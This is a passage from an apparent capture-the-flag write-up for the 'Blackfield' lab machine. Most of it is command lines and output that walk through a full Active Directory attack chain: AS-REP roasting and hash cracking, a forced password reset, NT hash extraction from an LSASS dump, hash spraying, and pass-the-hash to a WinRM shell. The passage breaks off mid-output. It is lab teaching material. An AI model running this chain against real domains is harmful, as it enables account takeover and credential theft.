`impacket-GetNPUsers -dc-ip 10.10.10.192 'blackfield.local/guest' -no-pass -usersfile ./domain_users.txt`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User DC01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$support@BLACKFIELD.LOCAL:a3bd0c4e8d9627a7951c2351a78276a2$013e7203c1eeb5d2f4411830af8efba5f193cddc72ad51e9c623991e2af513ee3ac9e9c51bb82a73926db6cd9934baea501d709e6b6e5f5d4037f1b0f524257265cb5f756a74795f0c6e59c0ab5a16b2d5646b867b28999b8406296d22e99161c1f32cdf43c7952a6184d1a69d0e7301a83e59521a0c1ab1bab238bc161d3849fc4d632f33a2ce2277b512c31b431d6cc48e363c63294335d44595c131b6cb7b2c1da784630bf8a87117ea4a75dec43bab2792d8aa5934f1386bdd2de416bb38a8d48fa6f8333b962b403440471f087a36dbdc8d43e73aea2585ffe09cb27190c60656763d0c1b48fb81d0ef0767107e9c291917
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lydericlefebvre doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User PC01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User PC02$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User PC03$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User PC04$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User PC05$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User PC06$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User PC07$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User PC08$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User PC09$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User PC10$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User PC11$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User PC12$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User PC13$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User SRV-WEB$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User SRV-FILE$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User SRV-EXCHANGE$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User SRV-INTRANET$ doesn't have UF_DONT_REQUIRE_PREAUTH set
```

`impacket-GetNPUsers -dc-ip 10.10.10.192 'blackfield.local/guest' -no-pass -usersfile ./domain_users.txt -format john -outputfile ./asrep_hash.txt`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User DC01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$support@BLACKFIELD.LOCAL:99424a239c6d4592ed432746c1b62d2c$6b5250f2bab17ae9b30daae7be7d48a2eae628f0d61ec5cf7f394324562747293d4f7bef1070596fa01b33e958e6dbec36c42e50b558997df197d5d1cb777fee31aebc119e21552b07cb7eab8d2dd7c3c52925e6a5059b77d412ed1c24091028da307e5ebaa2dccb84920e943bfd5d270d74abe5b50f252a3eb10b6bdb68483a21aec9c7fcd410f1b1e3555bcf9e411bb631d528cb6d2d60e7451ab159f0b14374782d81f5bbe13e9d9de5f61558de0e218c270360a6a06bd9eefd34c9da931bd7e80e6f175545decb672f82d9bd37b724d81c323902fcad214249e192286d13a18b7c0ae08c0a7ab1c1886968d0397aaba2289d
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lydericlefebvre doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User PC01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User PC02$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User PC03$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User PC04$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User PC05$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User PC06$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User PC07$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User PC08$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User PC09$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User PC10$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User PC11$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User PC12$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User PC13$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User SRV-WEB$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User SRV-FILE$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User SRV-EXCHANGE$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User SRV-INTRANET$ doesn't have UF_DONT_REQUIRE_PREAUTH set
```

`cat ./asrep_hash.txt`:
```
$krb5asrep$support@BLACKFIELD.LOCAL:99424a239c6d4592ed432746c1b62d2c$6b5250f2bab17ae9b30daae7be7d48a2eae628f0d61ec5cf7f394324562747293d4f7bef1070596fa01b33e958e6dbec36c42e50b558997df197d5d1cb777fee31aebc119e21552b07cb7eab8d2dd7c3c52925e6a5059b77d412ed1c24091028da307e5ebaa2dccb84920e943bfd5d270d74abe5b50f252a3eb10b6bdb68483a21aec9c7fcd410f1b1e3555bcf9e411bb631d528cb6d2d60e7451ab159f0b14374782d81f5bbe13e9d9de5f61558de0e218c270360a6a06bd9eefd34c9da931bd7e80e6f175545decb672f82d9bd37b724d81c323902fcad214249e192286d13a18b7c0ae08c0a7ab1c1886968d0397aaba2289d
```

`john --wordlist=/usr/share/wordlists/rockyou.txt ./asrep_hash.txt`:
```
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 SSE2 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
#00^BlackKnight  ($krb5asrep$support@BLACKFIELD.LOCAL) ←  
1g 0:00:00:09 DONE (2024-11-10 09:06) 0.1075g/s 1541Kp/s 1541Kc/s 1541KC/s #1ByNature..#*burberry#*1990
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

`john --show ./asrep_hash.txt`:
```
$krb5asrep$support@BLACKFIELD.LOCAL:#00^BlackKnight ←

1 password hash cracked, 0 left
```

`netexec smb 10.10.10.192 -u 'support' -p '#00^BlackKnight'`:
```
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight ←
```

`netexec smb 10.10.10.192 -u 'support' -p '#00^BlackKnight' --shares`:
```
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight 
SMB         10.10.10.192    445    DC01             [*] Enumerated shares
SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
SMB         10.10.10.192    445    DC01             -----           -----------     ------
SMB         10.10.10.192    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.10.192    445    DC01             C$                              Default share
SMB         10.10.10.192    445    DC01             forensic                        Forensic / Audit share.
SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.10.192    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.10.192    445    DC01             profiles$       READ            
SMB         10.10.10.192    445    DC01             SYSVOL          READ            Logon server share
```

`netexec winrm 10.10.10.192 -u 'support' -p '#00^BlackKnight'`:
```
WINRM       10.10.10.192    5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
WINRM       10.10.10.192    5985   DC01             [-] BLACKFIELD.local\support:#00^BlackKnight
```
❌

`evil-winrm -i 10.10.10.192 -u 'support' -p '#00^BlackKnight'`:
```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
                                        
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
                                        
Error: Exiting with code 1
```
❌

`netexec smb 10.10.10.192 -u 'support' -p '#00^BlackKnight' --pass-pol`:
```
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight 
SMB         10.10.10.192    445    DC01             [+] Dumping password info for domain: BLACKFIELD
SMB         10.10.10.192    445    DC01             Minimum password length: 7
SMB         10.10.10.192    445    DC01             Password history length: 24
SMB         10.10.10.192    445    DC01             Maximum password age: 41 days 23 hours 53 minutes 
SMB         10.10.10.192    445    DC01             
SMB         10.10.10.192    445    DC01             Password Complexity Flags: 000001 ←
SMB         10.10.10.192    445    DC01                 Domain Refuse Password Change: 0
SMB         10.10.10.192    445    DC01                 Domain Password Store Cleartext: 0
SMB         10.10.10.192    445    DC01                 Domain Password Lockout Admins: 0
SMB         10.10.10.192    445    DC01                 Domain Password No Clear Change: 0
SMB         10.10.10.192    445    DC01                 Domain Password No Anon Change: 0
SMB         10.10.10.192    445    DC01                 Domain Password Complex: 1 ←
SMB         10.10.10.192    445    DC01             
SMB         10.10.10.192    445    DC01             Minimum password age: 1 day 4 minutes 
SMB         10.10.10.192    445    DC01             Reset Account Lockout Counter: 30 minutes 
SMB         10.10.10.192    445    DC01             Locked Account Duration: 30 minutes 
SMB         10.10.10.192    445    DC01             Account Lockout Threshold: None ←
SMB         10.10.10.192    445    DC01             Forced Log off Time: Not Set
```

The password policy has a `lockoutThreshold` of 0, which means we can attempt an unlimited
number of passwords without locking the account out (although this is quite noisy).

`windapsearch.py -d 'blackfield.local' --dc-ip 10.10.10.192 -u 'support' -p '#00^BlackKnight'`:
```
[+] Using Domain Controller at: 10.10.10.192
[+] Getting defaultNamingContext from Root DSE
[+]     Found: DC=BLACKFIELD,DC=local
[+] Attempting bind
[!] Error: invalid credentials ←
```
❌

`bloodhound-python -d 'blackfield.local' -ns 10.10.10.192 -u 'support' -p '#00^BlackKnight' -c DCOnly`:
```
INFO: Found AD domain: blackfield.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 316 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 18 computers
INFO: Found 0 trusts
INFO: Done in 00M 12S
```

`ls -l ./*.json`:
```   
-rw-rw-r-- 1 kali kali  46944 Nov 10 09:43 ./20241110094307_computers.json
-rw-rw-r-- 1 kali kali  55582 Nov 10 09:43 ./20241110094307_containers.json
-rw-rw-r-- 1 kali kali   3148 Nov 10 09:43 ./20241110094307_domains.json
-rw-rw-r-- 1 kali kali   4032 Nov 10 09:43 ./20241110094307_gpos.json
-rw-rw-r-- 1 kali kali  81312 Nov 10 09:43 ./20241110094307_groups.json
-rw-rw-r-- 1 kali kali   1668 Nov 10 09:43 ./20241110094307_ous.json
-rw-rw-r-- 1 kali kali 784303 Nov 10 09:43 ./20241110094307_users.json
```

`zip ./bh.zip ./*.json`:
```
  adding: 20241110094307_computers.json (deflated 96%)
  adding: 20241110094307_containers.json (deflated 95%)
  adding: 20241110094307_domains.json (deflated 77%)
  adding: 20241110094307_gpos.json (deflated 86%)
  adding: 20241110094307_groups.json (deflated 94%)
  adding: 20241110094307_ous.json (deflated 65%)
  adding: 20241110094307_users.json (deflated 97%)
```

`sudo neo4j console`

`bloodhound`

`Database Info` > `Refresh Database Stats`
`Database Info` > `Clear Sessions`
`Database Info` > `Clear Database`

`Upload Data: ~/bh.zip` > `Clear Finished`

`Search for a node: support` > `SUPPORT@BLACKFIELD.LOCAL` > `<right-click>` > `Mark User as Owned`

`SUPPORT@BLACKFIELD.LOCAL` > `Node Info`:
```
[...]

#### EXECUTION RIGHTS

|   |   |
|---|---|
|First Degree RDP Privileges|0|
|Group Delegated RDP Privileges|0|
|First Degree DCOM Privileges|0|
|Group Delegated DCOM Privileges|0|
|SQL Admin Rights|0|
|Constrained Delegation Privileges|0|

---

#### OUTBOUND OBJECT CONTROL

|   |   |
|---|---|
|First Degree Object Control|1| ←
|Group Delegated Object Control|0|
|Transitive Object Control|

[...]
```

Our `support` user has the password change permission on the `audit2020` user.

`Graph`:
```
SUPPORT ---(ForceChangePassword)--- AUDIT2020
```

`ForceChangePassword`:
```
Info:

The user SUPPORT@BLACKFIELD.LOCAL has the capability to change the user AUDIT2020@BLACKFIELD.LOCAL's password without knowing that user's current password.
```
```
Linux Abuse:

Use samba's net tool to change the user's password. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line. The new password will be prompted if omitted from the command line.
~~~
net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"
~~~

Pass-the-hash can also be done here with [pth-toolkit's net tool](https://github.com/byt3bl33d3r/pth-toolkit). If the LM hash is not known it must be replace with `ffffffffffffffffffffffffffffffff`.
~~~
pth-net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"
~~~

Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab.
```

`Search for a node: svc_backup` > `SVC_BACKUP@BLACKFIELD.LOCAL` > `<right-click>` > `Mark User as High Value`

`Search for a node: lydericlefebvre` > `LYDERICLEFEBVRE@BLACKFIELD.LOCAL` > `<right-click>` > `Mark User as High Value`

`Analysis` > `Shortest Paths` > `Shortest Paths to High Value Targets` > `Select a Domain: BLACKFIELD.LOCAL`

`Graph`:
```
SVC_BACKUP ---(MemberOf)--- BACKUP OPERATORS
```

`impacket-changepasswd -altuser 'support' -altpass '#00^BlackKnight' 'blackfield.local/audit2020@10.10.10.192' -newpass 'H4ck3d!' -no-pass -reset`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Setting the password of blackfield.local\audit2020 as blackfield.local\support
[*] Connecting to DCE/RPC as blackfield.local\support
[*] Password was changed successfully.
[!] User no longer has valid AES keys for Kerberos, until they change their password again.
```

`netexec smb 10.10.10.192 -u 'audit2020' -p 'H4ck3d!'`:
```
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\audit2020:H4ck3d! ←
```

`netexec smb 10.10.10.192 -u 'audit2020' -p 'H4ck3d!' --shares`:
```
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\audit2020:H4ck3d! 
SMB         10.10.10.192    445    DC01             [*] Enumerated shares
SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
SMB         10.10.10.192    445    DC01             -----           -----------     ------
SMB         10.10.10.192    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.10.192    445    DC01             C$                              Default share
SMB         10.10.10.192    445    DC01             forensic        READ            Forensic / Audit share. ←
SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.10.192    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.10.192    445    DC01             profiles$       READ            
SMB         10.10.10.192    445    DC01             SYSVOL          READ            Logon server share 
```

We connect to the `forensic` share and see a zipped lsass memory dump. LSASS is short for Local Security Authority Subsystem Service, and it stores credentials in memory on behalf of a user that has an active (or recently active) session. This allows the user to access network resources without re-typing their credentials for each service. LSASS may store credentials in multiple
forms, including reversibly encrypted password, Kerberos tickets, NT hash, LM hash, DPAPI keys, and Smartcard PIN.

Credentials are stored in LSASS for sessions that have been established since the last reboot and have not been closed. For example, credentials are created in memory when a user does any of the following (this is not an exhaustive list).
- Logs on to a local session or RDP session on the computer.
- Runs a process using `RunAs`.
- Runs an active Windows service on the computer.
- Creates a scheduled task or batch job.
- Runs `PsExec` with explicit creds, such as `PsExec \\server -u user -p pwd cmd`.
- Uses WinRM with CredSSP.

`smbclient -U 'audit2020' --password='H4ck3d!' '//10.10.10.192/forensic'`:
```
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Nov 10 18:06:40 2024
  ..                                  D        0  Sun Nov 10 18:06:40 2024
  commands_output                     D        0  Sun Feb 23 19:14:37 2020
  memory_analysis                     D        0  Thu May 28 22:28:33 2020
  tools                               D        0  Sun Feb 23 14:39:08 2020

                5102079 blocks of size 4096. 1690299 blocks available
```

`netexec smb 10.10.10.192 -u 'audit2020' -p 'H4ck3d!' --shares -M spider_plus`:
```
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\audit2020:H4ck3d! 
SPIDER_PLUS 10.10.10.192    445    DC01             [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.10.10.192    445    DC01             [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.10.10.192    445    DC01             [*]     STATS_FLAG: True
SPIDER_PLUS 10.10.10.192    445    DC01             [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.10.10.192    445    DC01             [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.10.10.192    445    DC01             [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.10.10.192    445    DC01             [*]  OUTPUT_FOLDER: /tmp/nxc_hosted/nxc_spider_plus
SMB         10.10.10.192    445    DC01             [*] Enumerated shares
SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
SMB         10.10.10.192    445    DC01             -----           -----------     ------
SMB         10.10.10.192    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.10.192    445    DC01             C$                              Default share
SMB         10.10.10.192    445    DC01             forensic        READ            Forensic / Audit share.
SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.10.192    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.10.192    445    DC01             profiles$       READ            
SMB         10.10.10.192    445    DC01             SYSVOL          READ            Logon server share 
SPIDER_PLUS 10.10.10.192    445    DC01             [+] Saved share-file metadata to "/tmp/nxc_hosted/nxc_spider_plus/10.10.10.192.json". ←
SPIDER_PLUS 10.10.10.192    445    DC01             [*] SMB Shares:           7 (ADMIN$, C$, forensic, IPC$, NETLOGON, profiles$, SYSVOL)
SPIDER_PLUS 10.10.10.192    445    DC01             [*] SMB Readable Shares:  5 (forensic, IPC$, NETLOGON, profiles$, SYSVOL)
SPIDER_PLUS 10.10.10.192    445    DC01             [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.10.10.192    445    DC01             [*] Total folders found:  369
SPIDER_PLUS 10.10.10.192    445    DC01             [*] Total files found:    726
SPIDER_PLUS 10.10.10.192    445    DC01             [*] File size average:    977.56 KB
SPIDER_PLUS 10.10.10.192    445    DC01             [*] File size min:        0 B
SPIDER_PLUS 10.10.10.192    445    DC01             [*] File size max:        125.87 MB
```

`cat /tmp/nxc_hosted/nxc_spider_plus/10.10.10.192.json`:
```json
{
    "NETLOGON": {},
    "SYSVOL": {
        "BLACKFIELD.local/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI": {
            "atime_epoch": "2020-02-23 12:20:36",
            "ctime_epoch": "2020-02-23 12:13:14",
            "mtime_epoch": "2020-02-23 12:20:36",
            "size": "22 B"
        },

[...]

	},
    "forensic": {
        "memory_analysis/lsass.zip": {
            "atime_epoch": "2020-05-28 22:25:08",
            "ctime_epoch": "2020-05-28 22:25:01",
            "mtime_epoch": "2020-05-28 22:29:24",
            "size": "39.99 MB"
        },

[...]

	},
    "profiles$": {}
}
```

So we download the `lsass` process memory dump locally for further inspection.

`smbclient -U 'audit2020' --password='H4ck3d!' '//10.10.10.192/forensic'`:
```
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Nov 10 18:06:40 2024
  ..                                  D        0  Sun Nov 10 18:06:40 2024
  commands_output                     D        0  Sun Feb 23 19:14:37 2020
  memory_analysis                     D        0  Thu May 28 22:28:33 2020 ←
  tools                               D        0  Sun Feb 23 14:39:08 2020

                5102079 blocks of size 4096. 1659951 blocks available
smb: \> cd memory_analysis\
smb: \memory_analysis\> dir
  .                                   D        0  Thu May 28 22:28:33 2020
  ..                                  D        0  Thu May 28 22:28:33 2020
  conhost.zip                         A 37876530  Thu May 28 22:25:36 2020
  ctfmon.zip                          A 24962333  Thu May 28 22:25:45 2020
  dfsrs.zip                           A 23993305  Thu May 28 22:25:54 2020
  dllhost.zip                         A 18366396  Thu May 28 22:26:04 2020
  ismserv.zip                         A  8810157  Thu May 28 22:26:13 2020
  lsass.zip                           A 41936098  Thu May 28 22:25:08 2020 ←
  mmc.zip                             A 64288607  Thu May 28 22:25:25 2020
  RuntimeBroker.zip                   A 13332174  Thu May 28 22:26:24 2020
  ServerManager.zip                   A 131983313  Thu May 28 22:26:49 2020
  sihost.zip                          A 33141744  Thu May 28 22:27:00 2020
  smartscreen.zip                     A 33756344  Thu May 28 22:27:11 2020
  svchost.zip                         A 14408833  Thu May 28 22:27:19 2020
  taskhostw.zip                       A 34631412  Thu May 28 22:27:30 2020
  winlogon.zip                        A 14255089  Thu May 28 22:27:38 2020
  wlms.zip                            A  4067425  Thu May 28 22:27:44 2020
  WmiPrvSE.zip                        A 18303252  Thu May 28 22:27:53 2020

                5102079 blocks of size 4096. 1659951 blocks available
smb: \memory_analysis\> get lsass.zip ←
getting file \memory_analysis\lsass.zip of size 41936098 as lsass.zip (2033.1 KiloBytes/sec) (average 2033.1 KiloBytes/sec)
```

`ls -l ./lsass.zip`:
```
-rw-rw-r-- 1 kali kali 41936098 Nov 10 23:40 ./lsass.zip
```

`file ./lsass.zip`:
```
lsass.zip: Zip archive data, at least v2.0 to extract, compression method=deflate 
```

`unzip ./lsass.zip`:
```
Archive:  lsass.zip
  inflating: lsass.DMP
```

After unzipping `lsass.zip` we can use `pypykatz` on the extracted `lsass.DMP` file to retrieve NT hashes.

`pypykatz lsa minidump ./lsass.DMP`:
```
INFO:pypykatz:Parsing file ./lsass.DMP
FILE: ======== ./lsass.DMP =======
== LogonSession ==
authentication_id 406458 (633ba)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406458
        == MSV ==
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
                DPAPI: a03cd8e9d30171f3cfe8caad92fef62100000000
        == WDIGEST [633ba]==
                username svc_backup
                domainname BLACKFIELD
                password None
                password (hex)
        == Kerberos ==
                Username: svc_backup
                Domain: BLACKFIELD.LOCAL
        == WDIGEST [633ba]==
                username svc_backup
                domainname BLACKFIELD
                password None
                password (hex)

[...]
```

`pypykatz lsa minidump ./lsass.DMP | grep 'NT:' -B3`:
```
INFO:pypykatz:Parsing file ./lsass.DMP
                Username: svc_backup ←
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d ←
--
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
--
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
--
                Username: Administrator
                Domain: BLACKFIELD
                LM: NA
                NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62

[...]
```

We can extract all hashes from the lsass dump and save them in a file.

`pypykatz lsa minidump ./lsass.DMP | grep -i 'NT:' |  awk '{ print $2 }' | sort -u | tee ./domain_hashes.txt`:
```
7f1e4ff8c6a8e6b6fcae2d9c0572cd62
9658d1d1dcd9250115e2205d9f48400d
b624dc83a27cc29da11d9bf25efea796
```

`netexec smb 10.10.10.192 -u ./domain_users_lowercase.txt -H ./domain_hashes.txt`:
```
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\administrator:7f1e4ff8c6a8e6b6fcae2d9c0572cd62 STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\guest:7f1e4ff8c6a8e6b6fcae2d9c0572cd62 STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\krbtgt:7f1e4ff8c6a8e6b6fcae2d9c0572cd62 STATUS_LOGON_FAILURE 

[...]

SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\dc01$:9658d1d1dcd9250115e2205d9f48400d STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\audit2020:9658d1d1dcd9250115e2205d9f48400d STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\support:9658d1d1dcd9250115e2205d9f48400d STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d ←
```

This was successful, and we found a working combination: `svc_backup`:`9658d1d1dcd9250115e2205d9f48400d`.

`netexec smb 10.10.10.192 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'`:
```
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d ←
```

`netexec smb 10.10.10.192 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d' --shares`:
```
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d 
SMB         10.10.10.192    445    DC01             [*] Enumerated shares
SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
SMB         10.10.10.192    445    DC01             -----           -----------     ------
SMB         10.10.10.192    445    DC01             ADMIN$          READ            Remote Admin
SMB         10.10.10.192    445    DC01             C$              READ,WRITE      Default share
SMB         10.10.10.192    445    DC01             forensic                        Forensic / Audit share.
SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.10.192    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.10.192    445    DC01             profiles$       READ            
SMB         10.10.10.192    445    DC01             SYSVOL          READ            Logon server share 
```

`netexec winrm 10.10.10.192 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'`:
```
WINRM       10.10.10.192    5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
WINRM       10.10.10.192    5985   DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d (Pwn3d!) ←
```

`evil-winrm -i 10.10.10.192 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'`:
```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_backup\Documents>
```

![Victim: svc_backup](https://custom-icon-badges.demolab.com/badge/Victim-svc%5F_backup-64b5f6?logo=windows11&logoColor=white)

`whoami`:
```
blackfield\svc_backup
```

`dir C://Users/svc_backup/Desktop`:
```
    Directory: C:\Users\svc_backup\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/28/2020   2:26 PM             32 user.txt ←
```

`type C://Users/svc_backup/Desktop/user.txt`:
```
3920b*************************** 🚩
```

`whoami /all`:
```
USER INFORMATION
----------------

User Name             SID
===================== ==============================================
blackfield\svc_backup S-1-5-21-4194615774-2175524697-3563712290-1413


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
